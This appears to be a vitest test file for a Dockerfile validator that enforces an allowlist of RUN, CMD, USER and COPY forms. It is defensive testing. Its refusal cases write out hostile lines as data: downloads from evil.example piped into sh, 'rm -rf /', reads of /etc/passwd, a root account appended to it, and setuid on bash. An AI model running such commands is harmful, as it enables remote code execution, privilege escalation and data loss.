// D3 fix round 1: RUN/CMD/ENTRYPOINT/HEALTHCHECK are a strict allowlist (R1), USER is one of four values (R2), and the smaller fixes (R3).
// The reviewer's repro fixtures are in test/fixtures/dockerfile-attacks/.
import { readdirSync, readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { buildsInsideOf, DOCKERIGNORE_LINES, dockerfileProblems, dockerignoreText, type DockerfileCtx } from '../src/create/dockerfile-rules.js';
import { reviewExistingCodes } from '../src/create/dockerfile.js';
import { baseImageRef, loadBaseImages } from '../src/engine/base-images.js';
import { emptyServiceQuality } from '../src/read/quality.js';
import type { Service } from '../src/types.js';

const REF = baseImageRef('node-24-bookworm-slim');
const svc = (over: Partial<Service> = {}): Service => ({
  name: 'api', path: 'api', language: 'node', packageManager: 'npm', hasTests: true, envVars: [], dependsOn: [], scripts: ['start', 'build'], frameworks: [], quality: emptyServiceQuality(), ...over,
});
const ctx = (over: Partial<DockerfileCtx> = {}): DockerfileCtx => ({ port: 3000, baseImages: loadBaseImages(), buildsInside: false, scripts: ['start', 'build'], ...over });
const problems = (t: string, over: Partial<DockerfileCtx> = {}): string[] => dockerfileProblems(t, svc(), ctx(over));
const SINGLE = [`FROM ${REF}`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --omit=dev --ignore-scripts', 'COPY . .', 'EXPOSE 3000', 'USER node', 'CMD ["node", "index.js"]', ''].join('\n');
const MULTI = [
  `FROM ${REF} AS build`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --ignore-scripts', 'COPY . .', 'RUN npm run build',
  `FROM ${REF}`, 'WORKDIR /app', 'COPY --from=build --chown=node:node /app/dist ./dist', 'EXPOSE 3000', 'USER node', 'CMD ["node", "dist/index.js"]', '',
].join('\n');
const swap = (t: string, a: string, b: string): string => { expect(t).toContain(a); return t.replace(a, b); };
const withRun = (cmd: string): string => swap(SINGLE, 'COPY . .', `RUN ${cmd}`);
const refused = (t: string, re: RegExp = /.+/, over: Partial<DockerfileCtx> = {}): void => {
  const p = problems(t, over);
  expect(p.length, t).toBeGreaterThan(0);
  expect(p.join('\n'), t).toMatch(re);
};

describe('R1: the reviewer\'s fixtures', () => {
  const dir = new URL('./fixtures/dockerfile-attacks/', import.meta.url);
  const GOOD = new Set(['baseline', 'multi_baseline', 'env_port', 'lower_instrs', 'mkdir_chown', 'arg_tag', 'cmd_exec_shell_c_ok', 'cont_comment_empty', 'shebang_line', 'user_node_numeric']);
  const MULTI_STAGE = new Set(['multi_baseline', 'final_from_build']);
  it('every attack fixture is refused; the plain ones pass', () => {
    const names = readdirSync(dir).filter((n) => n.endsWith('.Dockerfile')).map((n) => n.replace('.Dockerfile', ''));
    expect(names.length).toBeGreaterThanOrEqual(50);
    for (const n of names) {
      const p = problems(readFileSync(new URL(`${n}.Dockerfile`, dir), 'utf8'), { buildsInside: MULTI_STAGE.has(n) });
      if (GOOD.has(n)) expect(p, n).toEqual([]);
      else expect(p.length, n).toBeGreaterThan(0);
    }
  });
});

describe('R1: RUN is an allowlist', () => {
  it('the allowed commands pass, joined only by &&', () => {
    for (const cmd of [
      'npm ci --ignore-scripts', 'npm ci --omit=dev --ignore-scripts', 'npm ci --ignore-scripts --omit=optional --no-audit --no-fund', 'npm ci --no-fund --ignore-scripts',
      'npm ci --ignore-scripts && npm run build', 'npm ci --ignore-scripts && npm prune --omit=dev && npm cache clean --force', 'mkdir -p /app/data && chown -R node:node /app/data',
      'mkdir -p data', 'chown node:node /app',
    ]) expect(problems(withRun(cmd)), cmd).toEqual([]);
    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci", "--omit=dev", "--ignore-scripts"]'))).toEqual([]);
    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN --mount=type=cache,target=/root/.npm npm ci --ignore-scripts'))).toEqual([]);
    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN --network=none npm ci --ignore-scripts'))).toEqual([]);
    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN npm ci --ignore-scripts \\\n  && npm run build'))).toEqual([]);
  });

  it('npm ci: --ignore-scripts exactly once and literally, each flag at most once, no other word', () => {
    for (const cmd of [
      'npm ci', 'npm ci --omit=dev', 'npm ci --ignore-scripts false', 'npm ci --ignore-scripts=true', 'npm ci --ignore-scripts=false', 'npm ci --no-ignore-scripts', 'npm ci --ignore-scripts --ignore-scripts',
      'npm ci --omit=dev --ignore-scripts false', 'npm ci -- --ignore-scripts', 'npm ci --ignore-scripts --', 'npm ci --ignore-scripts --omit=dev --omit=dev', 'npm ci --omit dev --ignore-scripts',
      'npm ci --production --ignore-scripts', 'npm ci --ignore-scripts --registry=https://evil.example', 'npm ci --ignore-scripts evil-pkg', 'npm ci --ignore-scripts --force', 'npm ci --ignore-scripts --omit=peer',
      'npm ci --ignore-scripts --userconfig=/tmp/x', 'npm ci --ignore-scripts --foreground-scripts', 'npm   ci   --ignore-scripts false', 'npm clean-install --ignore-scripts', 'npm ci --ignore-scripts --include=dev',
    ]) refused(withRun(cmd), /RUN/);
  });

  it('every other command is refused: installs, interpreters, fetchers, shells, variables, pipes, redirects, substitutions', () => {
    for (const cmd of [
      'npm install', 'npm install evil-pkg', 'npm i evil', 'npm add evil', 'npm update', 'npm rebuild', 'npm exec evil', 'npm cache add https://evil.example/x.tgz', 'npm config set registry x', 'npm pack evil', 'npm run postinstall',
      'npm run nosuchscript', 'npm run build -- --evil', 'npm run build evil', 'npm run', 'npm run ../x', 'npm run build;evil', 'npm prune', 'npm prune --omit=dev --force', 'npm cache clean', 'npm cache clean --force --x',
      'npx evil', 'yarn install', 'pnpm i', 'bun install', 'corepack enable', 'node -e "1"', "node -e 'fetch(1)'", 'node script.js', 'python -c 1', 'perl -e 1', 'sh -c "npm ci"', 'bash x.sh', 'sh x.sh',
      'curl https://evil.example/x -o /tmp/x', 'wget https://evil.example/x', 'git clone https://evil.example/x', 'apt-get install -y curl', 'apt-get update', 'chmod +x x', 'chmod u+s /bin/bash', 'useradd -o -u 0 app', 'su -c id',
      'echo hi', 'cat /etc/passwd', 'echo "x:x:0:0::/:/bin/sh" >> /etc/passwd', 'rm -rf /', 'ln -s /etc/passwd x', 'eval x', 'true', 'cd /app', 'env', 'exec npm ci --ignore-scripts',
      '${N:-npm} install evil', '$N install evil', '$(echo npm) install', '`echo npm` install', 'npm ci --ignore-scripts | sh', 'npm ci --ignore-scripts |& sh', 'npm ci --ignore-scripts; id', 'npm ci --ignore-scripts & id',
      'npm ci --ignore-scripts || id', 'npm ci --ignore-scripts > /tmp/x', 'npm ci --ignore-scripts < /tmp/x', 'npm ci --ignore-scripts && curl x', 'npm ci --ignore-scripts &&', '&& npm ci --ignore-scripts',
      'npm ci --ignore-scripts && && npm run build', 'npm ci --ignore-scripts  &&npm run build', 'npm ci --ignore-scripts&&npm run build', "npm ci --ignore-scripts 'x'", 'npm ci --ignore-scripts "x"',
      'npm ci --ignore-scripts #x', 'npm ci --ignore-scripts *', 'npm ci --ignore-scripts ~', 'npm ci --ignore-scripts {a,b}', 'npm ci --ignore-scripts (id)', 'npm ci --ignore-scripts \\x',
      'mkdir -p ../x', 'mkdir -p /a/../b', 'mkdir -p -x', 'mkdir x', 'mkdir -p a b', 'mkdir -p /etc/cron.d$X', 'chown root:root /app', 'chown -R root /app', 'chown node:node ../x', 'chown -R node:node', 'chown -h node:node /app', 'chown --reference=x node:node y',
      'FOO=1 npm ci --ignore-scripts', 'sudo npm ci --ignore-scripts', 'env npm ci --ignore-scripts', 'npm ci --ignore-scripts && true',
    ]) refused(withRun(cmd), /RUN/);
    // exec form of other words, and exec form with a word that is not plain
    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["sh", "-c", "npm ci --ignore-scripts"]'), /RUN/);
    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci --ignore-scripts"]'), /RUN/);
    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci", "--ignore-scripts", ""]'), /RUN/);
    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN []'), /RUN/);
  });

  it('npm run <name> only for a name in the service scripts (the context, not the file)', () => {
    expect(problems(swap(MULTI, 'RUN npm run build', 'RUN npm run build:prod'), { buildsInside: true, scripts: ['build:prod'] })).toEqual([]);
    refused(swap(MULTI, 'RUN npm run build', 'RUN npm run build:prod'), /RUN/, { buildsInside: true });
    refused(MULTI, /RUN/, { buildsInside: true, scripts: [] });
    refused(MULTI, /RUN/, { buildsInside: true, scripts: ['Build'] });
    // a script name outside the plain set is never allowed, even if the context lists it
    refused(swap(MULTI, 'RUN npm run build', 'RUN npm run $(id)'), /RUN/, { buildsInside: true, scripts: ['$(id)'] });
  });

  it('RUN flags: none, the one cache mount, or --network=none', () => {
    for (const f of ['--mount=type=cache,target=/root/.npm', '--network=none']) expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', `RUN ${f} npm ci --ignore-scripts`)), f).toEqual([]);
    for (const f of [
      '--mount=type=cache,target=/tmp', '--mount=type=cache,target=/root/.npm,sharing=shared', '--mount=type=cache,target=/root/.npm,from=evil', '--mount=type=secret,id=x', '--mount=type=ssh', '--mount=type=bind,source=/,target=/h',
      '--mount=type=bind,from=evil,target=/x', '--mount=type=cache,target=/root/.npm --mount=type=ssh', '--mount=type=cache,target=/root/.npm,type=bind', '--mount=type=cache,type=secret,target=/root/.npm',
      '--mount=type=cache,target=/root/.npm,source=/etc', '--mount=target=/root/.npm', '--mount=', '--network=none --network=none', '--mount=type=cache,target=/root/.npm --mount=type=cache,target=/root/.npm', '--network=host', '--network=default', '--security=insecure', '--security=sandbox', '--device=x', '--mount=type=cache,target=/root/.npm,id=a',
    ]) refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', `RUN ${f} npm ci --ignore-scripts`), /RUN/);
  });
});

describe('R1: CMD exec form from a grammar; ENTRYPOINT and HEALTHCHECK refused', () => {
  const cmd = (line: string): string => swap(SINGLE, 'CMD ["node", "index.js"]', line);
  it('the three CMD forms pass', () => {
    for (const line of ['CMD ["node", "index.js"]', 'CMD ["node","dist/index.js"]', 'CMD ["node", "server.mjs"]', 'CMD ["node", "./src/main.cjs"]', 'CMD ["npm", "start"]', 'CMD ["npm", "run", "build"]', 'cmd ["npm","start"]']) expect(problems(cmd(line)), line).toEqual([]);
  });
  it('anything else is refused', () => {
    for (const line of [
      'CMD node index.js', 'CMD npm start', 'CMD ["sh", "-c", "node index.js"]', 'CMD ["node"]', 'CMD ["node", "index.ts"]', 'CMD ["node", "index"]', 'CMD ["node", "index."]', 'CMD ["node", "x.json"]', 'CMD ["node", "x.jsx"]', 'CMD ["node", "app.js.txt"]', 'CMD ["node", "index"]', 'CMD ["node", "x.json"]', 'CMD ["node", "x.jsx"]', 'CMD ["node", ".js/"]', 'CMD ["node", "/etc/passwd.js"]', 'CMD ["node", "../x.js"]', 'CMD ["node", "-e", "1"]', 'CMD ["node", "-r", "x.js"]',
      'CMD ["node", "a.js", "b"]', 'CMD ["node", "--import", "x.js"]', 'CMD ["node", "-x.js"]', 'CMD ["npm", "run", "nosuch"]', 'CMD ["npm", "test"]', 'CMD ["npm", "start", "--", "x"]', 'CMD ["npm", "install"]', 'CMD []', 'CMD ["", ""]', 'CMD',
      'CMD ["bash", "-c", "cat /app/x |& sh"]', 'CMD ["sh","-c","wget -O /tmp/x https://evil.example/x && sh /tmp/x"]',
    ]) refused(cmd(line), /CMD/);
    refused(`${SINGLE}CMD ["npm", "start"]\n`, /CMD|exactly one/);   // a second CMD is not a thing pipegen writes
  });
  it('ENTRYPOINT and HEALTHCHECK are refused whatever they say', () => {
    for (const line of ['ENTRYPOINT ["node", "index.js"]', 'ENTRYPOINT ["npm", "start"]', 'ENTRYPOINT node index.js', 'ENTRYPOINT ["sh", "-c", "curl -o /tmp/a URL; sh /tmp/a"]', 'entrypoint ["node","index.js"]']) refused(swap(SINGLE, 'EXPOSE 3000', `EXPOSE 3000\n${line}`), /ENTRYPOINT/);
    for (const line of ['HEALTHCHECK NONE', 'HEALTHCHECK CMD node healthcheck.js', 'HEALTHCHECK --interval=30s CMD ["node", "h.js"]', 'HEALTHCHECK CMD node -e "fetch(\'https://evil.example/\')"']) refused(swap(SINGLE, 'EXPOSE 3000', `EXPOSE 3000\n${line}`), /HEALTHCHECK/);
  });
});

describe('R2: USER is node, node:node, 1000 or 1000:1000 in every stage', () => {
  it('only the four values pass', () => {
    for (const u of ['node', 'node:node', '1000', '1000:1000']) expect(problems(swap(SINGLE, 'USER node', `USER ${u}`)), u).toEqual([]);
    for (const u of [
      '-0', '-00', '+0', '-0:-0', 'node:-0', 'node:0', 'node:00', '1000:0', 'root', '0', '0:0', '1', '2000', '1001', 'app', 'nobody', 'node:1000', '1000:node', '$UID', '${U}', 'Node', '65534', '+1000', '01000', '1000:+1000',
    ]) refused(swap(SINGLE, 'USER node', `USER ${u}`), /USER/);
    // a USER root before the final one is refused too (the build user is node as well)
    refused(swap(SINGLE, 'WORKDIR /app', 'USER root\nWORKDIR /app'), /USER/);
    refused(swap(MULTI, 'RUN npm run build', 'USER app\nRUN npm run build'), /USER/);
    // the final stage needs one (own, or inherited from the stage it starts from)
    refused(swap(SINGLE, 'USER node\n', ''), /USER/);
    expect(problems([`FROM ${REF} AS base`, 'WORKDIR /app', 'RUN npm ci --ignore-scripts', 'USER node', 'FROM base', 'WORKDIR /app', 'EXPOSE 3000', ''].join('\n'))).toEqual([]);
  });
  it('reviewExisting flags every spelling of root: -0, +0, 00, any :0 group', () => {
    for (const u of ['-0', '+0', '00', '0', 'root', '0:0', 'node:0', '-0:-0', '1000:00', '$X']) expect(reviewExistingCodes(`FROM ${REF}\nUSER ${u}\n`).map((c) => c.code), u).toContain('root-user');
    for (const u of ['node', '1000', '1000:1000', 'node:node']) expect(reviewExistingCodes(`FROM ${REF}\nUSER ${u}\n`), u).toEqual([]);
  });
});

describe('R3', () => {
  it('m3: COPY --chmod is 3 octal digits, --chown is node:node or 1000:1000, other flags are refused', () => {
    const copy = (flags: string): string => swap(MULTI, 'COPY --from=build --chown=node:node /app/dist ./dist', `COPY --from=build ${flags} /app/dist ./dist`);
    for (const f of ['--chmod=755', '--chmod=0644', '--chown=node:node', '--chown=1000:1000', '--link', '--chmod=755 --chown=node:node --link']) expect(problems(copy(f), { buildsInside: true }), f).toEqual([]);
    for (const f of ['--chmod=4755', '--chmod=2755', '--chmod=1777', '--chmod=u+s', '--chmod=07755', '--chmod=75', '--chmod=', '--chmod=$X', '--chown=root:root', '--chown=0:0', '--chown=root', '--chown=node', '--chown=1000', '--chown=node:0', '--chown=$X',
      '--parents', '--exclude=x', '--link=false', '--from=build', '--chmod=755 --chmod=700']) refused(copy(f), /COPY/, { buildsInside: true });
    refused(swap(SINGLE, 'COPY . .', 'RUN chmod u+s /bin/bash'), /RUN/);
  });

  it('m4: with a build step the final stage starts from a list reference, not from an earlier stage', () => {
    refused([`FROM ${REF} AS build`, 'RUN npm ci --ignore-scripts', 'RUN npm run build', 'FROM build', 'EXPOSE 3000', 'USER node', 'CMD ["node", "dist/index.js"]', ''].join('\n'), /final stage/, { buildsInside: true });
    expect(problems([`FROM ${REF} AS base`, 'WORKDIR /app', 'RUN npm ci --ignore-scripts', 'USER node', 'FROM base', 'WORKDIR /app', 'EXPOSE 3000', ''].join('\n'), { buildsInside: false })).toEqual([]);
  });

  it('m5: stage names match in exact case, in FROM and in COPY --from', () => {
    refused(swap(MULTI, 'COPY --from=build', 'COPY --from=BUILD'), /--from/, { buildsInside: true });
    refused(swap(MULTI, 'AS build', 'AS Build'), /stage name/, { buildsInside: true });
    refused([`FROM ${REF} AS base`, 'RUN npm ci --ignore-scripts', 'USER node', 'FROM BASE', 'EXPOSE 3000', ''].join('\n'), /FROM/);
    expect(reviewExistingCodes(`FROM ${REF} AS base\nFROM BASE\nUSER 1000\n`).map((c) => c.code)).toEqual(['unpinned-base']);
  });

  it('m2: the .dockerignore lines (S6 amendment), in order, and nothing else', () => {
    const lines = [
      '.git', '.env*', '**/.env*', '**/*.pem', '**/*.key', '**/.npmrc', '**/.netrc', '**/*.tfstate', '**/*.tfvars', '**/id_rsa*', '**/node_modules', '.venv',
      '**/.git', '**/.ssh', '**/.aws', '**/.docker', '**/.git-credentials', '**/id_ed25519*', '**/id_ecdsa*', '**/id_dsa*', '**/*.p12', '**/*.pfx', '**/*.jks', '**/*.tfstate.backup', '**/*.tfvars.json',
    ];
    expect([...DOCKERIGNORE_LINES].slice(0, lines.length)).toEqual(lines);   // round 2 adds five more (dockerfile-rules-r2.test.ts pins the whole text)
    expect(buildsInsideOf(svc())).toBe(true);
  });
});
